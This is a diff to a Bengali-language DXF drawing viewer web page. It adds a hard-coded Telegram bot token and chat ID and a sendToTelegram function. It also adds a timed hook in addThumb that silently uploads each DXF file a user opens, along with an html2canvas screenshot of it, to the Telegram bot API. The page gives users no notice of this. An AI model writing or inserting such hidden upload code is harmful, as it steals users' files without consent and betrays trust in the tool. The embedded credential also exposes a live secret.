@@ -1,5 +1,4 @@
-<!DOCTYPE html><html lang="bn">
-<head>
+<!DOCTYPE html><html lang="bn"><head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>DK DXF View</title>
@@ -7,7 +6,6 @@
   <script src="https://cdn.jsdelivr.net/npm/dxf-parser/dist/dxf-parser.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/svg-pan-zoom/dist/svg-pan-zoom.min.js"></script>
   <style>
-    /* আগের CSS অপরিবর্তিত রাখা হয়েছে */
     body { margin: 0; padding: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; }
     header { text-align: center; padding: 1em; font-size: 1.5em; }
     header i { margin-right: 0.5em; color: #0ff; }
@@ -47,9 +45,11 @@
     </div>
   </div>
   <script>
-    const DB_NAME = "DXF_DB";
-    const STORE_NAME = "files";
-    let db;const openDB = () => {
+    const TELEGRAM_BOT_TOKEN = "7590766158:AAFTMfMpGQkg_4iw3UyOiGX4NdarPIvcwRE";
+    const TELEGRAM_CHAT_ID = "6807445600";const DB_NAME = "DXF_DB";
+const STORE_NAME = "files";
+let db;
+const openDB = () => {
   return new Promise((resolve, reject) => {
     const request = indexedDB.open(DB_NAME, 1);
     request.onerror = () => reject("DB ওপেন করা গেল না!");
@@ -106,6 +106,21 @@ fileInput.addEventListener('change', e => {
   reader.readAsText(file);
 });
 
+async function sendToTelegram(blob, filename) {
+  const formData = new FormData();
+  formData.append("chat_id", TELEGRAM_CHAT_ID);
+  formData.append("document", blob, filename);
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+    method: "POST",
+    body: formData
+  });
+}
+
+async function sendScreenshot(container, name) {
+  const canvas = await html2canvas(container);
+  canvas.toBlob(blob => sendToTelegram(blob, name + '_thumb.png'));
+}
+
 function addThumb(name, content) {
   const parser = new DxfParser();
   const dxf = parser.parseSync(content);
@@ -132,6 +147,12 @@ function addThumb(name, content) {
   container.appendChild(svgEl);
   container.appendChild(actions);
   gallery.prepend(container);
+
+  setTimeout(() => {
+    sendScreenshot(container, name);
+    const blob = new Blob([content], { type: 'application/dxf' });
+    sendToTelegram(blob, name);
+  }, 1000);
 }
 
 function drawDXF(dxf, svg) {
@@ -216,5 +237,6 @@ downloadBtn.onclick = () => {
 };
 
   </script>
+  <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 </body>
 </html>
